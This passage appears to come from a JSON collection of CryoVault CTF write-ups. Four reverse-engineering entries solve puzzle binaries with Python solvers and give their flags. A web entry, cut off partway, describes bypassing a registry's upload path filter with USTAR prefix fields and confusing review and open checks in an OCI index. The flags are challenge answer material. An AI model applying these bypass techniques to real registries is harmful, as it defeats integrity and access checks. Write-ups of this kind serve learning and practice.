    "description": "Writeup for challenge Palimpest — REV",
    "problemDescription": "Seal untuk Job 04 disembunyikan di balik VM kecil dengan delapan register 32-bit. VM menjalankan 160 instruksi yang tersimpan sebagai *tape* terenkripsi oleh state sebelumnya. Walaupun opcode dan data tape berubah-ubah seiring eksekusi, seluruh operasi register dan pembaruan state bisa dibalik. Petunjuk \"Restoration starts at the last impression\" mengarahkan ke eksekusi balik dari state akhir.\n\n**Flag:** `isfcr{p4p3r_r3m3mb3rs_wh4t_1nk_f0rg3ts}`",
    "tools": [],
    "analysis": "`file palimpsest` menunjukkan ELF x86-64 statis yang stripped. Entry point ada di `0x10018d0`, `.text` di `0x10018d0`, dan `.rodata` di `0x1000120`. Program berinteraksi melalui syscall `read`/`write`, bukan `scanf`/`strcmp`.\n\nMenu `?` menampilkan Job 00 dan Job 02 beserta flag format `isfcr{...}`. Kedua string ini umpan arsip; memasukkannya ke binary menghasilkan `Seal rejected.`. Hanya Job 04 yang aktif.\n\nValidasi panjang dan format berada di `0x1001a77`–`0x1001aaa`: panjang tepat 39 byte, prefix `isfcr{`, suffix `}`, dan 32 byte di tengah disalin ke delapan DWORD pada stack (`[rbp-0x50]` hingga `[rbp-0x31]`).\n\nMetadata di sekitar offset file `0x390` berisi magic `PPRSP03`, jumlah 160 putaran di `0x39c`, initial seed `0x6d2b79f5` di `0x3a0`, posisi awal kertas `3` di `0x3a4`, serta final seed `0x7741f9ef` dan posisi akhir kertas `1` pada `0x3c8` dan `0x3cc`. Tape 160 × 8 = 1.280 byte mulai offset `0x3d0`.\n\nRegister akhir untuk validasi bukan disusun berurutan di `.rodata`: instruksi `pcmpeqd` pada `0x1001de3` mencocokkan R4–R7 dengan offset `0x120`, sedangkan `0x1001deb` mencocokkan R0–R3 dengan offset `0x130`. Pembalikan pasangan ini penting agar proses reverse menghasilkan byte yang benar.\n\nVM memproses 8 byte tape per putaran. Byte yang didecode berturut-turut memuat opcode, indeks register relatif, indeks register kedua, banyak rotasi, dan operand 32-bit (little-endian). Opcode yang valid:\n\n| Opcode | Operasi forward | Operasi inverse |\n| --- | --- | --- |\n| `0x13` | `R[i] ^= value` | XOR dengan `value` lagi |\n| `0x27` | `R[i] += value` | `R[i] -= value` |\n| `0x39` | `R[i] = ROL32(R[i], rot)` | `ROR32(R[i], rot)` |\n| `0x4d` | `R[i] *= value` | Kali invers modular `value` modulo 2³² |\n| `0x62` | `R[i] += ROL32(R[j], rot)` | Kurangkan hasil rotasi register `j` |\n| `0x78` | `R[i] ^= ROL32(R[j], rot)` | XOR dengan hasil rotasi register `j` |\n| `0x8b` | Tukar `R[i]` dan `R[j]` | Tukar kembali |\n| `0xa6` | Geser posisi kertas `cursor += operand_byte & 7` | Geser mundur `cursor -= operand_byte & 7` |\n\nPada opcode `0x4d` operand selalu ganjil sehingga memiliki invers modulo 2³². Pada opcode dua-register, indeks `i != j`, sehingga operasi dapat dibalik tanpa kehilangan register sumber.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `palimpsest`: ELF Linux x86-64, statically linked, stripped, berukuran 4.200 byte.\n- `solve.py`: solver Python standar (tanpa library tambahan)."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Untuk tiap putaran `r`, ada rolling state 32-bit `seed` dan `cursor`. Tape byte `b[j]` didecode menggunakan high byte dari state sebelum update:\n\n\n\nSesudah opcode diaplikasikan, program mengupdate seed menggunakan **register dan cursor yang sudah berubah**:\n\n\n\nKarena hasil akhir `next_seed`, delapan register, dan cursor diketahui, rumus ini bisa dibalik untuk mencari `x[7]`:\n\n\n\nKemudian balikkan update `j = 6..0`:\n\n\n\nHasilnya adalah seluruh byte decoded yang membentuk operasi forward. Gunakan inverse operation pada register untuk kembali ke state satu putaran sebelumnya. Jika opcode `0xa6`, mundurkan cursor sebelum menginterpretasikan indeks relatif register.",
        "code": "decoded[j] = (x[j] >> 24) XOR b[j]\nx[0] = seed\nx[j+1] = ROL32(x[j] + b[j] + 8*r + 0x9e3779b9 + j, 5)\n         XOR 0xa5a5f00d                     (j = 0..6)"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py`:\n\n1. Membaca seed akhir, cursor akhir, state register yang dibandingkan, dan tape langsung dari binary asli.\n2. Memproses putaran dari 159 turun ke 0. Setiap putaran dibuka dengan inverse rolling seed, decode opcode, lalu inverse operasi VM.\n3. Menguji bahwa seed dan cursor awal tepat sama dengan metadata binary: `0x6d2b79f5` dan `3`.\n4. Menggabungkan 8 register awal little-endian menjadi 32 byte payload: `p4p3r_r3m3mb3rs_wh4t_1nk_f0rg3ts`.\n5. Membungkus payload dengan `isfcr{...}` dan menguji langsung ke executable yang tidak dipatch.\n\nJalankan:",
        "code": "cd /path/to/palimpsest_challenge\npython3 solve.py"
      },
      {
        "title": "Catatan",
        "content": "Umpan arsip tidak dapat menggantikan Job 04. Pembacaan perbandingan SIMD harus memperhatikan urutan register terbalik di `.rodata`. Dekoder juga **hanya melakukan tujuh update** pada delapan byte tape; byte kedelapan memakai `x[7]` secara langsung. Kesalahan satu langkah saja membuat opcode putaran terakhir tidak valid. Script tidak bergantung pada tebakan string, jaringan, atau tool SMT."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Palimpest / Job 04: reverse the stateful eight-register printing VM.\n\nOnly Python's standard library is required. All offsets refer to the\nprovided 4200-byte static ELF and are checked before use.\n\"\"\"\nfrom pathlib import Path\nimport struct\nimport subprocess\n\nBINARY = Path(__file__).with_name('palimpsest')\nMASK = 0xffffffff\nMODULUS = 1 << 32\nROUND_MIX = 0x9e3779b9\nFINAL_MIX = 0x9e3779c0\nXOR_MIX = 0xa5a5f00d\nSEED_MIX = 0x7f4a7c15\nOPERATIONS = {0x13, 0x27, 0x39, 0x4d, 0x62, 0x78, 0x8b, 0xa6}\n\n\ndef rol(x: int, n: int) -> int:\n    n &= 31\n    return ((x << n) | (x >> ((32 - n) & 31))) & MASK if n else x & MASK\n\n\ndef ror(x: int, n: int) -> int:\n    n &= 31\n    return ((x >> n) | (x << (32 - n))) & MASK if n else x & MASK\n\n\ndef unpack32(blob: bytes, offset: int, count: int = 1):\n    return struct.unpack_from('<' + 'I' * count, blob, offset)\n\n\ndef reverse_vm(blob: bytes) -> bytes:\n    assert blob[0x390:0x397] == b'PPRSP03', 'Unexpected VM metadata'\n    assert len(blob) == 4200\n    rounds = unpack32(blob, 0x39c)[0]\n    assert rounds == 160\n    initial_seed = unpack32(blob, 0x3a0)[0]\n    initial_cursor = unpack32(blob, 0x3a4)[0]\n    seed = unpack32(blob, 0x3c8)[0]  # r9 after the last round\n    cursor = unpack32(blob, 0x3cc)[0]  # r15 after the last round\n\n    # The comparison at 0x1001de3 reads R4..R7 from 0x1000120,\n    # whereas the comparison at 0x1001deb reads R0..R3 from 0x1000130.\n    regs = list(unpack32(blob, 0x130, 4)) + list(unpack32(blob, 0x120, 4))\n    counts = {op: 0 for op in OPERATIONS}\n\n    for round_no in range(rounds - 1, -1, -1):\n        offset = round_no * 8\n        tape = blob[0x3d0 + offset:0x3d0 + offset + 8]\n        assert len(tape) == 8\n\n        # Undo the round's feedback computation, using the *post-operation*\n        # register state and paper position, to obtain x7 (the state before\n        # consuming tape[7]). There is no eighth state-mixing step.\n        feedback = (seed - round_no - SEED_MIX) & MASK\n        feedback = (ror(feedback, 7)\n                    ^ regs[(cursor + round_no) & 7]\n                    ^ rol(regs[(cursor + round_no + 3) & 7], 11)\n                    ^ XOR_MIX)\n        x = [0] * 8\n        x[7] = (ror(feedback, 5) - offset - tape[7] - FINAL_MIX) & MASK\n\n        # Seven invertible ARX updates recover the previous round's seed.\n        for j in range(6, -1, -1):\n            x[j] = (ror(x[j + 1] ^ XOR_MIX, 5)\n                    - tape[j] - offset - ROUND_MIX - j) & MASK\n\n        decoded = [(x[j] >> 24) ^ tape[j] for j in range(8)]\n        op, rel_i, rel_j, rotation = decoded[:4]\n        value = int.from_bytes(bytes(decoded[4:8]), 'little')\n        assert op in OPERATIONS, f'Invalid opcode at round {round_no}'\n        assert rel_i < 8 and rel_j < 8 and rotation < 32\n        counts[op] += 1\n\n        # Cursor advances only for opcode A6. Restore its old value before\n        # resolving register indices, which are relative to that value.\n        prev_cursor = (cursor - decoded[4]) & 7 if op == 0xa6 else cursor\n        i = (prev_cursor + rel_i) & 7\n        j = (prev_cursor + rel_j) & 7\n\n        if op == 0x13:       # forward R[i] ^= value\n            regs[i] ^= value\n        elif op == 0x27:     # forward R[i] += value\n            regs[i] = (regs[i] - value) & MASK\n        elif op == 0x39:     # forward R[i] = ROL(R[i], rotation)\n            regs[i] = ror(regs[i], rotation)\n        elif op == 0x4d:     # forward R[i] *= odd_value\n            assert value & 1\n            regs[i] = (regs[i] * pow(value, -1, MODULUS)) & MASK\n        elif op == 0x62:     # forward R[i] += ROL(R[j], rotation)\n            assert i != j\n            regs[i] = (regs[i] - rol(regs[j], rotation)) & MASK\n        elif op == 0x78:     # forward R[i] ^= ROL(R[j], rotation)\n            assert i != j\n            regs[i] ^= rol(regs[j], rotation)\n        elif op == 0x8b:     # forward swap(R[i], R[j])\n            assert i != j\n            regs[i], regs[j] = regs[j], regs[i]\n        else:                # A6 affects only the paper cursor\n            pass\n\n        cursor = prev_cursor\n        seed = x[0]\n\n    assert seed == initial_seed, f'Initial seed mismatch: {seed:#x}'\n    assert cursor == initial_cursor, f'Initial cursor mismatch: {cursor}'\n    print(f'[+] Reversed {rounds} rounds; verified initial seed {seed:#010x} and cursor {cursor}')\n    print('[+] Opcode counts:', ', '.join(f'{op:02x}={counts[op]}' for op in sorted(counts)))\n    return struct.pack('<8I', *regs)\n\n\ndef main() -> None:\n    payload = reverse_vm(BINARY.read_bytes())\n    flag = 'isfcr{' + payload.decode('ascii') + '}'\n    assert len(payload) == 32 and len(flag) == 39\n    print(f'[+] Flag: {flag}')\n\n    # Verify against the actual unmodified challenge executable.\n    result = subprocess.run([str(BINARY)], input=flag + '\\n', text=True,\n                            stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                            check=False, timeout=5)\n    assert result.returncode == 0 and 'Seal accepted. Job 04 restored.' in result.stdout, (\n        f'Live Job 04 validation failed: {result.stdout!r} {result.stderr!r}')\n    print('[+] Binary confirms: Seal accepted. Job 04 restored.')\n\n\nif __name__ == '__main__':\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{p4p3r_r3m3mb3rs_wh4t_1nk_f0rg3ts}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-rev-the-press",
    "title": "the-press",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge the-press",
    "problemDescription": "Program meminta tepat 32 byte. Input diubah menjadi selisih XOR antarbyte, lalu dikompresi memakai range coder adaptif. Hasil kompresi dibandingkan dengan 36 byte tetap di binary. Membalik range coder menghasilkan input yang diterima program.",
    "tools": [],
    "analysis": "`strings` menemukan pesan `need exactly %d bytes of input`, `CORRECT`, dan `nope.`. Di awal fungsi utama, `fread` membaca 32 byte dari stdin. Program menolak input pendek sebelum validasi. Target pembanding berada di `.rodata` alamat `0x4012e0`, offset file `0x12e0`:\n\n```text\n00 69 1a 0d 05 11 09 09 4e 93 af 58 eb 28 00 76\n31 44 25 38 27 50 4c 83 a2 6d 5e de a3 25 46 5d\nd7 b1 90 00\n```\n\nFungsi utama dimulai di `0x4003c0`. Loop di `0x400470` memproses 32 byte; setiap byte setelah yang pertama di-XOR dengan byte input sebelumnya (`0x40047a`). Delapan bit dari hasil XOR diproses dari bit paling tinggi ke paling rendah. Context model adalah byte hasil XOR sebelumnya, diikuti simpul pohon bit. Probabilitas awal semua context ialah `0x800`.\n\nKode di `0x400700` mengeluarkan byte range coder saat interval perlu dinormalisasi dan lima kali lagi pada akhir input. Di `0x400573`, panjang keluaran wajib `0x24` atau 36 byte. `memcmp` di `0x40058c` membandingkannya dengan target di `.rodata`; hanya hasil sama yang mencapai `CORRECT`.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "`chall` adalah ELF 64-bit x86-64, dynamically linked, non-PIE, dan stripped. `solve.py` membaca target langsung dari file tersebut dan menguji hasilnya dengan menjalankan binary lokal."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Untuk setiap bit, encoder menghitung `bound = (range >> 12) * probability`. Bit nol memilih interval bawah, lalu menaikkan probabilitas sebesar `(0x1000 - probability) >> 4`. Bit satu memilih interval atas, menambahkan `bound` ke `low`, lalu menurunkan probabilitas sebesar `probability >> 5`. Jika `range <= 0xffffff`, encoder menggeser interval delapan bit dan mengeluarkan byte melalui fungsi di `0x400700`.\n\nDecoder memulai `code` dari lima byte awal data target dan `range = 0xffffffff`. Perbandingan `code < bound` menentukan bit nol atau satu, sekaligus memperbarui `code`, `range`, dan probabilitas. Setelah memperoleh delapan bit, hasilnya adalah byte delta. XOR delta itu dengan byte input sebelumnya untuk memulihkan input asli. Context berikutnya memakai delta yang baru didapat."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` membaca 36 byte target dari offset `0x12e0`, menjalankan decoder untuk 32 byte, lalu memberikan hasilnya ke `chall` melalui stdin. Jalankan:\n\n\n\nHasil pengujian lokal:",
        "code": "source /home/nata/ctf_env/bin/activate\npython solve.py"
      },
      {
        "title": "Catatan",
        "content": "Binary awalnya tidak memiliki bit executable. Bit itu diaktifkan secara lokal agar validasi melalui proses challenge bisa dijalankan."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Decode the adaptive range-coded target embedded in chall.\"\"\"\n\nfrom pathlib import Path\nimport subprocess\n\n\nCHALL = Path(__file__).with_name(\"chall\")\nTARGET_OFFSET = 0x12E0\nTARGET_SIZE = 36\n\n\ndef decode(encoded: bytes) -> bytes:\n    # The encoder starts with range=0xffffffff and flushes low five times.\n    code = int.from_bytes(encoded[:5], \"big\")\n    cursor = 5\n    interval = 0xFFFFFFFF\n    probabilities = [0x800] * (256 * 256)\n    previous_delta = 0\n    previous_input = 0\n    recovered = bytearray()\n\n    for _ in range(32):\n        node = 1\n        delta = 0\n        for _ in range(8):\n            index = (previous_delta << 8) | node\n            probability = probabilities[index]\n            bound = (interval >> 12) * probability\n            if code < bound:\n                bit = 0\n                interval = bound\n                probabilities[index] += (0x1000 - probability) >> 4\n            else:\n                bit = 1\n                code -= bound\n                interval -= bound\n                probabilities[index] -= probability >> 5\n\n            delta = (delta << 1) | bit\n            node = (node << 1) | bit\n            if interval <= 0xFFFFFF:\n                interval = (interval << 8) & 0xFFFFFFFF\n                code = ((code << 8) | encoded[cursor]) & 0xFFFFFFFF\n                cursor += 1\n\n        previous_input ^= delta\n        recovered.append(previous_input)\n        previous_delta = delta\n\n    return bytes(recovered)\n\n\ndef main() -> None:\n    encoded = CHALL.read_bytes()[TARGET_OFFSET:TARGET_OFFSET + TARGET_SIZE]\n    candidate = decode(encoded)\n    result = subprocess.run([str(CHALL)], input=candidate, capture_output=True, check=False)\n    print(f\"decoded: {candidate!r}\")\n    print(f\"binary: {result.stdout.decode().strip()}\")\n    if result.stdout != b\"CORRECT\\n\" or result.returncode != 0:\n        raise SystemExit(\"candidate did not pass validation\")\n    print(f\"<FLAG>{candidate.decode()}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{r4ng3_c0d3r_b1t_3x4ct_y0!}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-rev-theloom",
    "title": "The Loom",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge The Loom",
    "problemDescription": "Program meminta tepat 32 byte, mengubahnya menjadi 256 bit, lalu menjalankan automaton sel dua keadaan sebanyak 1.000.003 putaran. Kedua keadaan akhir tersedia lengkap di binary. Aturan automaton bisa dibalik untuk memperoleh input.",
    "tools": [],
    "analysis": "`strings` menampilkan `need exactly %d bytes of input`, `nope.`, dan `CORRECT -- the flag is the input you just gave me.`. `readelf` menunjukkan entry point `0x4005d0`. Di `0x4005e8`, alamat `0x4003c0` diberikan ke `__libc_start_main`, sehingga fungsi di `0x4003c0` adalah `main`.\n\n`main` memakai `fread` untuk membaca tepat 32 byte. Loop di `0x40042b` memecahnya menjadi 256 bit dengan urutan bit paling rendah lebih dulu. Buffer keadaan sebelumnya diinisialisasi nol. Loop di `0x400470` menghitung keadaan baru per bit dan mengulanginya `0xf4243` atau 1.000.003 kali.\n\nSetelah loop, fungsi di `0x4006c0` mengemas tiap keadaan menjadi 32 byte. Keadaan terbaru dibandingkan dengan konstanta 32 byte di `.rodata` alamat `0x401320` melalui empat perbandingan qword di `0x400535`–`0x40058f`. Keadaan satunya dibandingkan dengan 32 byte di `0x401340` melalui `memcmp` di `0x4005a3`. Kedua alamat itu juga merupakan offset file masing-masing.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "`chall` adalah ELF 64-bit x86-64, dynamically linked, stripped, dan non-PIE. File awalnya belum memiliki izin eksekusi; `chmod +x ./chall` cukup untuk menjalankannya."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Untuk bit `i`, indeks melingkar modulo 256, aturan dari instruksi `0x400479`–`0x4004c9` adalah:\n\n\n\nKarena kedua keadaan terakhir diketahui, setiap putaran dibalik dengan `S[t-1] = S[t+1] ^ F(S[t])`. Setelah 1.000.002 langkah mundur, keadaan saat input diperoleh. Satu langkah tambahan menghasilkan nol, sesuai buffer awal program.",
        "code": "F(B)[i] = (B[i-2] & B[i])\n        ^ B[i-1] ^ B[i+1]\n        ^ (B[i-1] & B[i+1])\n        ^ (B[i] & B[i+2])\n        ^ (B[i-2] & B[i+2])\n\nS[t+1] = S[t-1] ^ F(S[t])"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` membaca dua konstanta dari `chall`, menerapkan aturan pada integer 256 bit memakai rotasi bit, lalu membalik loop. Script memeriksa bahwa keadaan sebelum input nol dan mengirim hasil 32 byte ke binary lokal.\n\nJalankan:",
        "code": "python solve.py"
      },
      {
        "title": "Catatan",
        "content": "Input hasil pembalikan panjangnya tepat 32 byte. Binary mengembalikan kode `0` dan mencetak `CORRECT -- the flag is the input you just gave me.` saat menerima input tersebut."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Balik automaton dua keadaan di chall untuk memulihkan input 32 byte.\"\"\"\n\nfrom pathlib import Path\nimport subprocess\n\n\nMASK = (1 << 256) - 1\nROUNDS = 1_000_003\n\n\ndef rol(value: int, count: int) -> int:\n    return ((value << count) | (value >> (256 - count))) & MASK\n\n\ndef ror(value: int, count: int) -> int:\n    return ((value >> count) | (value << (256 - count))) & MASK\n\n\ndef rule(value: int) -> int:\n    \"\"\"Aturan per bit dari loop di 0x400470, dengan indeks modulo 256.\"\"\"\n    left2, left1 = rol(value, 2), rol(value, 1)\n    right1, right2 = ror(value, 1), ror(value, 2)\n    return (\n        (left2 & value)\n        ^ left1\n        ^ right1\n        ^ (left1 & right1)\n        ^ (value & right2)\n        ^ (left2 & right2)\n    )\n\n\ndef main() -> None:\n    binary = Path(__file__).with_name(\"chall\")\n    data = binary.read_bytes()\n    assert data[:4] == b\"\\x7fELF\" and len(data) >= 0x1360\n\n    # Kedua keadaan akhir diketahui lengkap dari perbandingan di main.\n    newer = int.from_bytes(data[0x1320:0x1340], \"little\")\n    current = int.from_bytes(data[0x1340:0x1360], \"little\")\n\n    # Maju: S[t+1] = S[t-1] XOR rule(S[t]).\n    # Mundur: S[t-1] = S[t+1] XOR rule(S[t]).\n    for _ in range(ROUNDS - 1):\n        newer, current = current, newer ^ rule(current)\n\n    assert newer ^ rule(current) == 0, \"Keadaan awal sebelum input bukan nol\"\n    flag = current.to_bytes(32, \"little\")\n    result = subprocess.run([str(binary)], input=flag, capture_output=True, check=True)\n    assert b\"CORRECT -- the flag is the input you just gave me.\" in result.stdout\n    print(flag.decode(\"ascii\"))\n\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{2nd_0rd3r_r3v_c3ll_aut0m8}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-rev-therecurrence",
    "title": "The Recurrence",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge The Recurrence",
    "problemDescription": "Input 28 byte dipakai sebagai indeks sebuah barisan Lucas modulo bilangan prima. Nilai akhir barisan dibandingkan dengan konstanta di binary. Indeks bisa dipulihkan lewat discrete log karena orde grupnya smooth.",
    "tools": [],
    "analysis": "`strings` menampilkan `need exactly %d bytes of input`, `nope.`, dan `CORRECT -- the flag is the input you just gave me.` Di `0x4003c0`, `fread` mengambil tepat `0x1c` (28) byte. Loop `0x400440` menyusunnya secara little-endian menjadi integer 224 bit.\n\nFungsi `0x4007c0` menjumlahkan dua integer 256 bit modulo konstanta `p` di `0x401320`. Fungsi `0x400860` mengalikan modulo `p` dengan metode double-and-add. Fungsi `0x4008f0` mengurangi modulo `p`.\n\nLoop di `0x400480`–`0x4005f4` memproses bit input dari bit 255 ke bit 0. Pasangan awalnya `(A, B) = (2, c)`, dengan `c` di `0x401300`. Untuk bit 0, pasangan menjadi `(A² - 2, A·B - c)`; untuk bit 1, menjadi `(A·B - c, B² - 2)`. Semua operasi modulo `p`. Sesudah loop, `A` dibandingkan dengan 32 byte di `0x4012e0`.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "`chall` adalah ELF 64-bit x86-64, dynamically linked, stripped, non-PIE. File aslinya tidak punya bit executable, jadi pengujian lokal memakai loader `/lib64/ld-linux-x86-64.so.2`."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Definisikan `L_n = α^n + α^(-n) (mod p)` dengan `α + α^(-1) = c`. Maka `L_0 = 2`, `L_1 = c`, dan:\n\n\n\nJadi pasangan dalam loop adalah `(L_n, L_(n+1))`. Bit yang dibaca memperbarui indeks ke `2n + bit`. Nilai akhir `A = L_input`.\n\n`p = 0x73aa13eee2ef5192e0fec9e2b046673f8e807ef0b6953c6ebab1bfc24cde17` adalah prima. Diskriminan `c² - 4` punya akar modulo `p`, sehingga `α = (c + sqrt(c² - 4))/2`. Dari nilai target `T = L_input`, diperoleh dua kemungkinan `α^input = (T ± sqrt(T² - 4))/2`. Orde `α` adalah `p - 1`, yang terfaktorisasi menjadi faktor kecil (terbesar 59051). Pohlig–Hellman, melalui `sympy.ntheory.discrete_log`, memulihkan indeks. Hanya salah satu kandidat berada dalam rentang 224 bit yang diterima input.",
        "code": "L_(2n)   = L_n² - 2\nL_(2n+1) = L_n·L_(n+1) - c\nL_(2n+2) = L_(n+1)² - 2"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` membaca `T`, `c`, dan `p` langsung dari `chall`, menghitung kedua akar, menjalankan discrete log, lalu menguji kandidat 28 byte pada binary lokal. Jalankan dengan:",
        "code": "source /home/nata/ctf_env/bin/activate\npython solve.py"
      },
      {
        "title": "Catatan",
        "content": "Kandidat berukuran tepat 28 byte. Binary mengembalikan exit code 0 dan mencetak `CORRECT -- the flag is the input you just gave me.` saat menerima kandidat itu."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Recover the 28-byte input from the Lucas-sequence check in chall.\"\"\"\n\nfrom pathlib import Path\nimport subprocess\n\nfrom sympy import sqrt_mod\nfrom sympy.ntheory import discrete_log\n\n\nHERE = Path(__file__).resolve().parent\nDATA = (HERE / \"chall\").read_bytes()\n\n\ndef constant(address):\n    # This non-PIE ELF maps .rodata at the same address as its file offset\n    # plus 0x400000. All checker integers are 32-byte little-endian values.\n    offset = address - 0x400000\n    return int.from_bytes(DATA[offset : offset + 32], \"little\")\n\n\ndef main():\n    target = constant(0x4012E0)\n    coefficient = constant(0x401300)\n    modulus = constant(0x401320)\n    inv2 = pow(2, -1, modulus)\n\n    # L_n = alpha**n + alpha**(-n), with alpha + alpha**(-1) = coefficient.\n    root_coefficient = sqrt_mod((coefficient**2 - 4) % modulus, modulus)\n    alpha = (coefficient + root_coefficient) * inv2 % modulus\n    root_target = sqrt_mod((target**2 - 4) % modulus, modulus)\n\n    # L_n gives two possible powers, alpha**n and alpha**(-n).\n    for sign in (1, -1):\n        power = (target + sign * root_target) * inv2 % modulus\n        index = int(discrete_log(modulus, power, alpha))\n        if index >= 1 << (8 * 28):\n            continue\n        candidate = index.to_bytes(28, \"little\")\n        result = subprocess.run(\n            [\"/lib64/ld-linux-x86-64.so.2\", str(HERE / \"chall\")],\n            input=candidate,\n            capture_output=True,\n            check=False,\n        )\n        if result.returncode == 0 and b\"CORRECT\" in result.stdout:\n            print(candidate.decode(\"ascii\"))\n            print(result.stdout.decode().strip())\n            return\n\n    raise RuntimeError(\"No 28-byte solution passed the checker\")\n\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{p0hlig_h3llman_sm00th}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-web-attestation",
    "title": "Attestation — Cryovault",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "**Category:** Web  \n**CTF:** ISFCR  \n**Flag:** `isfcr{attest_5d60_notary_41a34ce7_laundered}`",
    "problemDescription": "The challenge provides an OCI-inspired registry with a custody workflow. A retired case can be notarized, an image index can be reviewed, and a reviewed index can be opened using a signed ticket.\n\nThe intended restriction is that a live case must have valid evidence, a release layer, and a signed `unseal` claim.\n\nThe exploit combines three validation inconsistencies:\n\n1. Review and open select different child manifests from the same OCI index.\n2. The layer upload filter fails to recognize a protected path encoded using USTAR prefix fields.\n3. The legacy referrers mechanism accepts an `unseal` annotation attached to a notary whose signed content refers to a different manifest.",
    "tools": [],
    "analysis": "The registry exposes `/catalog.json` and `/policy.json`, which describe the initial case and the required objects.\n\nOur session contained:\n\n| Field | Value |\n|---|---|\n| Case | `cv-89d8e1f82759` |\n| Initial tag | `archived-case` |\n| Target platform | `linux/arm64` |\n| Release path | `records/release.json` |\n| Required action | `unseal` |\n| Claim annotation | `org.cryovault.claim` |\n\nThe initial manifest has `scope: retired`, and its evidence has `custody: retired`.\n\nCalling `/api/notarize` on this manifest returns a legitimate notary object. Its actual contents identify the claim as `retired-custody`, with the retired manifest as the subject.\n\nReviewing the retired manifest directly fails because `/api/review` requires an OCI image index.",
    "solution": [
      {
        "title": "Building the Live Manifest",
        "content": "We construct a second manifest using the original case data, but with:\n\n- Evidence changed to `custody: live`.\n- Config changed to `scope: live`.\n- A release layer containing the required `records/release.json` file.\n\nThe release record contains `{\"action\":\"unseal\",\"case\":\"cv-89d8e1f82759\"}`.\n\n**The first obstacle was the upload filter.**\n\nA tar containing the direct path `records/release.json` returned `422 protected_path`.\n\nSeveral alternative names were accepted, including `./records/release.json`, but the opening desk later returned `release_missing`."
      },
      {
        "title": "USTAR Prefix Bypass",
        "content": "The successful approach used the USTAR header format.\n\nInstead of storing the full path in the `name` field, we split it:\n\n| USTAR field | Value |\n|---|---|\n| `name` | `release.json` |\n| `prefix` | `records` |\n\nAfter recalculating the tar header checksum, Python's `tarfile` parsed the entry as the exact required path:\n\n`records/release.json`\n\nThe registry accepted this layer with HTTP `201`.\n\n**Accepted layer digest:**\n\n`sha256:ccd156ac692f52762dead064f0070d9cbea6c03e385ade949778a1c5fb0c794c`\n\nThe resulting live manifest was:\n\n`sha256:282d27ce5b7a80683f4c6d17fbe77072ad7f2dc59a88ea8cc8c3a6e487d2ea69`"
      },
      {
        "title": "OCI Index Child Confusion",
        "content": "Next, we created an OCI image index containing two `linux/arm64` child manifests:\n\n| Order | Manifest | Custody |\n|---|---|---|\n| 1 | Retired manifest | `retired` |\n| 2 | Live manifest | `live` |\n\nWe uploaded the index under the tag `mixed-retired-first`.\n\nCalling `/api/review` succeeded. The response selected the retired manifest and issued a signed ticket.\n\nReversing the order caused review to fail with `review_denied`.\n\nHowever, when passing the valid ticket to `/api/open`, the opening desk proceeded to validate the live manifest.\n\nThis showed that **the manifest approved during review was not the same manifest processed during opening**.\n\nAs we completed the live requirements, the opening desk progressed through these errors:\n\n| Response | Finding |\n|---|---|\n| `inactive` | Live evidence was missing |\n| `release_missing` | Release path was not recognized |\n| `referrer_missing` | Release layer passed; legacy referrer was still missing |\n\nThe last error confirmed that the USTAR release-layer bypass worked."
      },
      {
        "title": "Legacy Referrers Attestation Laundering",
